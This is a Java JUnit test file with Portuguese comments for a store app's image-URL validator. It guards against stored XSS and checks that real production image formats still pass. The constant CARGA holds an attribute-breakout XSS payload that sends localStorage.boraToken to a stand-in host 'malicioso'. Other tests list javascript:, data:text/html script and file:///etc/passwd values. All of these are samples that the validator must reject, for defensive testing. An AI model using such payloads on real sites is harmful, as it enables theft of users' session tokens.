package br.com.bora.service;

import org.junit.jupiter.api.Test;
import org.springframework.web.server.ResponseStatusException;

import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;

import static org.junit.jupiter.api.Assertions.*;

/**
 * A metade da GRAVAÇÃO do conserto do XSS: o endereço malicioso não entra no banco.
 *
 * <p>A tela já escapa a foto desde 18/11/2026, e há teste no frontend que cai se alguém tirar o
 * escape. Este arquivo fecha a outra ponta — ver {@link EnderecoDeImagem} para a razão de as duas
 * metades existirem, e para os formatos medidos em produção que a regra tem de aceitar.</p>
 *
 * <p><b>A carga usada aqui é a do achado</b>, não uma inventada para o teste passar.</p>
 */
class OenderecoDeIMAGEMnaoENTRAcruNObancoTest {

    /** A carga que um lojista gravaria em `imagemUrl` para sair do atributo `src`. */
    private static final String CARGA =
            "x\" onerror=\"new Image().src='https://malicioso/?t='+localStorage.boraToken";

    private static String valida(String v) {
        return EnderecoDeImagem.exigirValido(v, "a foto do produto");
    }

    private static String porqueRecusou(String v) {
        ResponseStatusException e = assertThrows(ResponseStatusException.class, () -> valida(v),
                "este valor tinha de ser RECUSADO: " + v);
        assertEquals(400, e.getStatusCode().value(), "recusa de dado do lojista é 400, não 500");
        return e.getReason();
    }

    // ----------------------------------------------------------------- a premissa

    /**
     * A PREMISSA: a carga do achado é recusada.
     *
     * <p>Se este teste passasse porque {@code exigirValido} recusa tudo, os controles abaixo
     * cairiam. É o par premissa + controle que dá sentido aos dois.</p>
     */
    @Test
    void aPREMISSAaCARGAdoACHADOehRECUSADA() {
        assertNotNull(porqueRecusou(CARGA));
    }

    // ----------------------------------------------------------------- os controles: produção real

    /**
     * O CONTROLE QUE MAIS IMPORTA: os formatos que as lojas usam HOJE continuam passando.
     *
     * <p>Medido no dump de produção de 18/11/2026: 200 produtos em {@code data:image/jpeg}, 31 em
     * {@code webp}, 1 em {@code png}, todos os logos em {@code jpeg}/{@code png}, e 1 banner
     * {@code https://}. Se esta validação recusasse qualquer um deles, o lojista perderia a imagem
     * ao salvar o produto — um conserto de segurança virando defeito de produto.</p>
     */
    @Test
    void oCONTROLEosFORMATOSdeProducaoCONTINUAMpassando() {
        String base64 = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8DwHwAFAAH/q842iQAAAABJRU5ErkJggg==";
        for (String tipo : new String[]{"jpeg", "jpg", "png", "webp", "gif", "avif"}) {
            String url = "data:image/" + tipo + ";base64," + base64;
            assertEquals(url, valida(url), "formato real de produção foi recusado: " + tipo);
        }
        // o banner https da loja 1, exatamente como está gravado
        assertEquals("https://test.com/banner-pro.jpg", valida("https://test.com/banner-pro.jpg"));
        // a forma que o PublicController devolve o logo -- gravar de volta não pode ser recusado
        assertEquals("/public/loja/1/logo", valida("/public/loja/1/logo"));
    }

    @Test
    void semIMAGEMehEstadoLEGITIMO() {
        assertNull(valida(null), "nulo é 'sem imagem'");
        assertNull(valida(""), "vazio é 'sem imagem'");
        assertNull(valida("   "), "só espaço é 'sem imagem'");
    }

    @Test
    void oESPACOaoREDORehAPARADOeNAOrecusado() {
        String url = "https://cdn.exemplo.com/foto.jpg";
        assertEquals(url, valida("  " + url + "  "),
                "espaço antes e depois é erro de digitação do lojista, não ataque");
    }

    // ----------------------------------------------------------------- o que tem de cair

    @Test
    void oJAVASCRIPTehRECUSADOemQUALQUERcaixa() {
        for (String v : new String[]{"javascript:alert(1)", "JavaScript:alert(1)",
                "JAVASCRIPT:alert(1)", "jAvAsCrIpT:alert(1)"}) {
            assertNotNull(porqueRecusou(v), "passou: " + v);
        }
    }

    @Test
    void oDATAdeHTMLehRECUSADO() {
        assertNotNull(porqueRecusou("data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="));
        assertNotNull(porqueRecusou("data:text/html,<script>alert(1)</script>"));
        assertNotNull(porqueRecusou("DATA:TEXT/HTML;base64,AAAA"),
                "a checagem do tipo tem de ignorar a caixa");
    }

    @Test
    void osCARACTERESdeSAIDAdeATRIBUTOsaoRECUSADOS() {
        for (String v : new String[]{
                "https://cdn/a\"b.jpg", "https://cdn/a'b.jpg", "https://cdn/a<b.jpg",
                "https://cdn/a>b.jpg", "https://cdn/a`b.jpg", "https://cdn/a\\b.jpg",
                "https://cdn/a b.jpg", "https://cdn/a\tb.jpg", "https://cdn/a\nb.jpg"}) {
            assertNotNull(porqueRecusou(v), "passou com caractere de saída: " + v);
        }
    }

    @Test
    void oPROTOCOLOherdadoNaoEHcaminhoDAorigem() {
        assertNotNull(porqueRecusou("//malicioso/foto.jpg"),
                "`//outro.site/x` não é caminho relativo: o navegador lê como outro site");
    }

    @Test
    void oHTTPsemSehRECUSADO() {
        assertNotNull(porqueRecusou("http://cdn.exemplo.com/foto.jpg"),
                "a CSP do cardápio permite img-src https:, não http:");
    }

    @Test
    void esquemaDESCONHECIDOehRECUSADO() {
        for (String v : new String[]{"file:///etc/passwd", "ftp://x/y.jpg", "vbscript:x",
                "foto.jpg", "C:\\fotos\\a.jpg"}) {
            assertNotNull(porqueRecusou(v), "passou: " + v);
        }
    }

    @Test
    void oDATAmalFORMADOehRECUSADO() {
        assertNotNull(porqueRecusou("data:image/png"), "sem vírgula, sem conteúdo");
        assertNotNull(porqueRecusou("data:image/png;base64,"), "conteúdo vazio");
        assertNotNull(porqueRecusou("data:image/svg+xml;base64,AAAA"),
                "SVG embutido executa script: não entra na lista de permissão");
        assertNotNull(porqueRecusou("data:image/png,AAAA"), "sem ;base64");
        assertNotNull(porqueRecusou("data:image/png;base64,AA*AA"), "conteúdo fora do alfabeto base64");
    }

    // ----------------------------------------------------------------- os três caminhos

    /**
     * A guarda contra esquecer um caminho: os TRÊS lugares que gravam endereço de imagem chamam a
     * validação.
     *
     * <p>Validador que existe e não é chamado é pior que não existir: dá a impressão de cobertura.
     * Este teste lê os arquivos e exige a chamada em cada um.</p>
     */
    @Test
    void osTRESCAMINHOSdeGRAVACAOchamamAvalidacao() throws Exception {
        String produto = Files.readString(
                Path.of("src/main/java/br/com/bora/service/ProdutoService.java"),
                StandardCharsets.UTF_8);
        String config = Files.readString(
                Path.of("src/main/java/br/com/bora/service/ConfiguracaoLojaService.java"),
                StandardCharsets.UTF_8);

        assertEquals(2, contar(produto, "EnderecoDeImagem.exigirValido"),
                "ProdutoService tem de validar nos DOIS caminhos: criar e atualizar");
        assertTrue(config.contains("EnderecoDeImagem.exigirValido(dados.logoUrl"),
                "o logo da loja é gravado sem validação");
        assertTrue(config.contains("EnderecoDeImagem.exigirValido(dados.bannerUrl"),
                "o banner da loja é gravado sem validação");
    }

    private static int contar(String texto, String agulha) {
        int n = 0, i = 0;
        while ((i = texto.indexOf(agulha, i)) >= 0) { n++; i += agulha.length(); }
        return n;
    }
}
